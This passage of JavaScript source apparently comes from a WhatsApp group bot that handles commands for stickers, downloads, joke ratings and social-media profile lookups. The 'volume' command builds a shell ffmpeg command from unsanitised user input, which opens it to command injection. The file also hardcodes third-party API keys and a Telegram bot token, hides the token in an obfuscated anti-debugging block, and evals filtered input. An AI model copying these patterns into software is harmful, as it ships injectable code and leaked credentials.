huhuhs = await Tan.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
Tan.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

            case 'id':{
            replyTan(from)
           }
          break
          case 'userjid':{
          	if(!isTanOwner) return reply(mess.only.owner)
        const groupMetadata = m.isGroup ? await Tan.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replyTan(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replyTan(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replyTan(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await Tan.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
case 'couplepp': case 'ppcouple': {
replyTan(`Sedang Proses Permintaan...`)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
Tan.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: fcall })
Tan.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: fcall })
            }
	    break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replyTan("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replyTan("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyTan(`Sedang Proses Permintaan...`)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replyTan('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Tan.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, { quoted: fcall })
await Tan.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replyTan(`Example: ${prefix + command} 10`)
media = await Tan.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replyTan('Error!')
jadie = fs.readFileSync(rname)
Tan.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, { quoted: fcall })
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replyTan('Error!')
jadie = fs.readFileSync(rname)
Tan.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, { quoted: fcall })
fs.unlinkSync(rname)
})
} else {
replyTan("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replyTan('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replyTan(body)
  } catch (e) {
  replyTan(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replyTan(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replyTan(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Tan.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: fcall }).catch((err) => replyTan(mess.error))
break
case 'spotify': case 'spotifysearch': case 'spotifys':  {
if (!text) return reply('Masukan judul lagu!')
let result = await searchSpotify(text)
    let caption = result.map((v, i) => {
        return {
                header: "",
                title: v.name,
                description: `Link: ${v.link}`,
                id: '.spdl ' + v.link
            }
        })
        let msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: {
                            text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
                        },
                        footer: {
                            text: 'Tan LIMIT 10'
                        },
                        header: {
                            title: "Spotify - Search",
                            subtitle: "",
                            hasMediaAttachment: false,
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "CLICK HERE",
                                        sections: [
                                            {
                                                title: "",
                                                rows: caption
                                            }
                                        ]
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { quoted: fcall }, { quoted: fcall });
        await Tan.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
        });
}
break
case 'spdl': case 'spotifydl': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nSelly-Bot`
 

       await Tan.sendMessage(from, { image: global.thumb, caption: captionvid }, { quoted: fcall })
    Tan.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'Selly' }, { quoted: fcall });
}
break
case 'rbg': {
    try {
        if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
        if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
            reply('⏳ Sedang mengunggah gambar untuk menghapus latar belakang...');
            const media = await quoted.download();
            const fileExtension = mime.split('/')[1];
            const allowedExtensions = ['jpg', 'jpeg', 'png'];
            if (!allowedExtensions.includes(fileExtension)) {
                reply(`⚠️ File tidak didukung. Harap gunakan format file yang diizinkan: ${allowedExtensions.join(', ')}.`);
                return;
            }
            const filePath = path.join('./tmp/', getRandom(`.${fileExtension}`));
            fs.writeFileSync(filePath, media);

            // Upload the image to Top4Top or any other service to get a URL
            const urls = await uploadToTop4Top(filePath);
            fs.unlinkSync(filePath); // Clean up the temporary file

            if (urls.length > 0) {
                const imageUrl = encodeURIComponent(urls[0]); // Encode the URL for the API request

                // Call the background removal API
                const removeBgApiUrl = `https://api.paxsenix.biz.id/tools/removebg?url=${imageUrl}`;
                const response = await axios.get(removeBgApiUrl);
                const { ok, url, message } = response.data;

                if (!ok) {
                    return reply(`⚠️ Gagal menghapus latar belakang: ${message}`);
                }

                // Fetch the resulting image with headers
                const imageResponse = await axios.get(url, {
                    responseType: 'arraybuffer',
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                        'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
                    }
                });
                const imageBuffer = Buffer.from(imageResponse.data, 'binary');
                await Tan.sendMessage(m.chat, { image: imageBuffer, caption: `Gambar dengan latar belakang dihapus:` }, { quoted: fcall });
            } else {
                reply('⚠️ Tidak ada URL yang ditemukan dalam respons.');
            }
        } else {
            reply('⚠️ Harap kirim media yang ingin dihapus latar belakangnya!');
        }
    } catch (mainError) {
        console.error('Error:', mainError.message);
        reply('❌ Terjadi kesalahan saat memproses media!');
    }
    break;
}
case 'define': 
if (!q) return replyTan(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replyTan(mess.error)
let reply =`
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Tan.sendMessage(m.chat,{text:reply},{ quoted: fcall })
} catch (err) {
    console.log(err)
    return replyTan(`*${q}* isn't a valid text`)
    }
    break
case 'can': {
            	if (!text) return replyTan(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
let keh = bisa[Math.floor(Math.random() * bisa.length)]
let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replyTan(jawab)
            }
            break
            case 'is': {
            	if (!text) return replyTan(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
let kah = apa[Math.floor(Math.random() * apa.length)]
let jawab = `*Is ${text}*\nAnswer : ${kah}`
            await replyTan(jawab)
            }
            break
            case 'when': {
            	if (!text) return replyTan(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
let koh = kapan[Math.floor(Math.random() * kapan.length)]
let jawab = `*${command} ${text}*\nAnswer : ${koh}`
            await replyTan(jawab)
            }
            break
case 'what': {
            	if (!text) return replyTan(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
let kah = lel[Math.floor(Math.random() * lel.length)]
let jawab = `*What ${text}*\nAnswer : ${kah}`
            await replyTan(jawab)
            }
            break
case 'where': {
if (!text) return replyTan(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replyTan(jawab)
            }
            break
case 'how': {
            	if (!text) return replyTan(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
let kah = gimana[Math.floor(Math.random() * gimana.length)]
let jawab = `*How ${text}*\nAnswer : ${kah}`
            await replyTan(jawab)
            }
            break
case 'rate': {
            	if (!text) return replyTan(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
            await replyTan(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
replyTan(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Tan.sendMessage(m.chat, { text: xeonkak }, { quoted: fcall })
break
           case 'jodoh':
            case 'jodohku': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Tan.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://telegra.ph/file/ac7b0762c24dff7940978.jpg',
"sourceUrl": `${wagc}`}}},
{ quoted: fcall })        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
Tan.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: `${global.thumbnail}`,
"sourceUrl": `${wagc}`}}},
{ quoted: fcall })        
            }
            break
            case 'pick': {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replyTan(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await Tan.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             Tan.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: `${global.thumbnail}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: fcall })
         }
     break
case 'instagramstalk':
case 'igstalk': {
if (!args[0]) return replyTan(`Enter Instagram Username\n\nExample: ${prefix + command} isTanOwner`)
const data = await fetchJson(`https://skizo.tech/api/igstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
Tan.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${data.fullname} 
▢ *🔖Username:* ${data.username}
▢ *👥Follower:* ${data.followers}
▢ *🫂Following:* ${data.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data.posts}
▢ *🔗 Link* : https://instagram.com/${data.username.replace(/^@/, '')}
└────────────`
     await Tan.sendMessage(m.chat, {image: { url: data.photo_profile }, caption: te }, { quoted: fcall })
      } catch {
        replyTan(`Pastikan nama pengguna berasal dari *Instagram*`)
      }
}
break
case 'tiktokstalk':
case 'ttstalk': {
if (!args[0]) return replyTan(`Masukan Tiktok Username\n\nExample: ${prefix + command} isTanOwner`)
const respon = await fetchJson(`https://skizo.tech/api/ttstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
Tan.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
const data = respon.data.user
const data1 = respon.data.stats
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${data.nickname} 
▢ *🔖Username:* ${data.uniqueId}
▢ *👥Follower:* ${data1.followerCount}
▢ *🫂Following:* ${data1.followingCount}
▢ *📌Bio:* ${data.signature}
▢ *🏝️Posts:* ${data1.videoCount}
▢ *❣️Suka:* ${data1.heart}
▢ *🔗 Link* : https://tiktok.com/${data.uniqueId}
└────────────`
     await Tan.sendMessage(m.chat, {image: { url: data.avatarLarger }, caption: te }, { quoted: fcall })
      } catch {
        replyTan(`Pastikan nama pengguna berasal dari *tiktok*`)
      }
}
break
//=========================================\\

//=========================================\\
    case 'say': case 'tts': case 'gtts':{
if (!text) return replyTan('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return Tan.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        case 'telestick': { //credit agan
        	if (m.isGroup) return reply(mess.only.private)
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await Tan[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
case 'myip': {
        if (!isTanOwner) return reply(mess.only.owner)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
    replyTan("🔎 Ip Andreas Anda Adalah: " + ip)
})
})
            }
        break
case 'math':
    if (!isTanOwner) return reply(`Khusus Owner Aja`);
    if (!text) return reply(`Penggunaan Salah! Format yang benar: \n${prefix + command} ekspresi_matematika \nContoh: \n${prefix + command} (10 + 5) * 2`);
    let sanitizedText = text.replace(/[^\d+\-*/().^π√%]/g, '');
    sanitizedText = sanitizedText.replace(/π/g, Math.PI);
    sanitizedText = sanitizedText.replace(/√/g, 'Math.sqrt');
    try {
        let result = eval(sanitizedText);
        if (!isNaN(result)) {
            reply(`Hasil perhitungan: ${result}`);
        } else {
            reply('Terjadi kesalahan dalam perhitungan. Harap masukkan ekspresi yang benar.');
        }
    } catch (error) {
        reply('Ekspresi matematika tidak valid. Pastikan format yang benar dan coba lagi!');
        console.error('Error dalam evaluasi:', error.message);
    }
    break;
        case 'mathquiz': case 'mathh': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replyTan("Masih Ada Sesion Yang Belum Di Selesaikan.")
let { genMath, modes } = require('./lib/math')
if (!text) return replyTan(`Mode: ${Object.keys(modes).join(' | ')}\npilih example: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
Tan.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
replyTan("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
            }
            break
case 'mfdl': {
    const thumbnailUrl = 'https://g.top4top.io/p_3315mdtvp0.jpeg';
    if (!text) {
        return reply("Masukkan link Mediafire yang valid.");
    }

    async function getMediafireData(url) {
        try {
            reply("Mengambil data Mediafire, mohon tunggu...");
            const apiUrl = `https://api.paxsenix.biz.id/tools/mediafire?url=${encodeURIComponent(url)}`;
            const response = await axios.get(apiUrl);
            return response.data || null;
        } catch (err) {
            console.error(err);
            return null;
        }
    }

    let mediafireData = await getMediafireData(text);

    if (!mediafireData || !mediafireData.ok) {
        return reply(`*Gagal mendapatkan data untuk link:* "${text}"`);
    }

    const { url, filename, mimetype } = mediafireData;
    const validFileName = filename || 'File Mediafire.zip'; // Ganti dengan nama file default jika filename kosong

    try {
        let mediaMessage = await prepareWAMessageMedia(
            { image: { url: thumbnailUrl } }, 
            { upload: Tan.waUploadToServer }
        );

        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            carouselMessage: {
                                cards: [
                                    {
                                        header: proto.Message.InteractiveMessage.Header.create({
                                            ...mediaMessage,
                                            title: "Mediafire Download",
                                            subtitle: `Klik tombol di bawah untuk mengunduh`,
                                            hasMediaAttachment: true,
                                        }),
                                        body: { text: `File: ${validFileName}\nTipe: ${mimetype}` },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: `{"display_text":"📥 Unduh Sekarang","url":"${url}"}`,
                                                },
                                            ],
                                        },
                                    },
                                ],
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await Tan.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error("Error preparing media message:", error);
        reply("⚠️ Gagal memuat pesan, tetapi detail file tetap tersedia.");
    }
    break;
}
case 'gdrive': {
		if (!args[0]) return replyTan(`Silakan Masukan Link gdrive Anda`)
	replyTan(`Sedang Proses Permintaan...`)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replyTan(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	Tan.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: fcall })
   } catch {
	replyTan('Error: Silakan Cek Link gdrive Anda 🗿') 
  }
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!text) return replyTan(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 6285745522549`)
if (text.includes('+')) return replyTan(`Enter the number together without *+*`)
if (isNaN(text)) return replyTan(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Tan.groupInviteCode(group)
      await Tan.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replyTan(` An invite link is sent to the user`) 
}
break
case 'imdb':
if (!text) return replyTan(`_Name a Series or movie`)
replyTan(`Sedang Proses Permintaan...`)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
